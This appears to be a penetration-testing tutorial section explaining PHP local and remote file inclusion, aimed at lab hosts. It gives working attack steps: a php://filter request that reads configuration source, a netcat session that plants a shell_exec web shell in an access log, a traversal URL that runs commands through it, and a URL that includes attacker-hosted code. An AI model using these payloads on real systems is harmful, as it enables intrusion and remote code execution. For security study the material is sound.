## LFI/RFI

Local (LFI) and remote (RFI) file inclusion vulnerabilities are commonly found in poorly written PHP code.

The exploitation of these vulnerabilities also depends on PHP versions and web server configurations, specifically `php.ini` values such as `register_globals` and `allow_url` wrappers.

LFI/RFI vulnerabilities allow an attacker to include a remote or local file into the webserver’s running PHP code.

LFI vulnerabilities are a subclass of RFIs.

The difference between the two is the web application’s capability to include either local or remote files.

RFI attacks allow the attacker to introduce his own code to the webserver, resulting in a quick compromise, while LFI attacks limit the attacker to including files already existing on the web server, thus making compromise more challenging.

Reading PHP source code using LFI and PHP Streams:

```bash
curl https://dotty.thinc.local/administrator/alerts/alertConfigField.php?urlConfig=php://filter/convert.base64-encode/resource=../Configuration.php
```

### LFI Code Execution

One option is to contaminate log files of various services to cause them to contain PHP code.
For example, consider the following netcat connection made to the victim server on port 80:

```bash
root@kali:~# nc -nv 10.11.1.35 80
(UNKNOWN) [10.11.1.35] 80 (http) open
<?php echo shell_exec($_GET['cmd']);?>
HTTP/1.1 400 Bad Request
```

Then you should visit this URL to execute your code.
Pay attention to the 'cmd' parameter:

```text
http://10.11.1.35/addguestbook.php?name=a&comment=b&cmd=ipconfig&LANG=../../../../../../../xampp/apache/logs/access.log%00
```

In versions of PHP below 5.3, we would be able to terminate our request with a null byte (%00) that would cause the PHP engine to ignore everything after that byte.

### RFI Code Execution

Remote file inclusion (RFI) vulnerabilities are less common than LFIs and are commonly easier to exploit. 
In fact, the LFI demonstrated above is also a RFI vulnerability.

Consider the following parameter given as the LANG value:

```text
http://10.11.1.35/addguestbook.php?name=a&comment=b&LANG=http://10.11.0.5/evil.txt
```

This request would force the PHP webserver to try to include a remote file, located on our web server, called `evil.txt`.
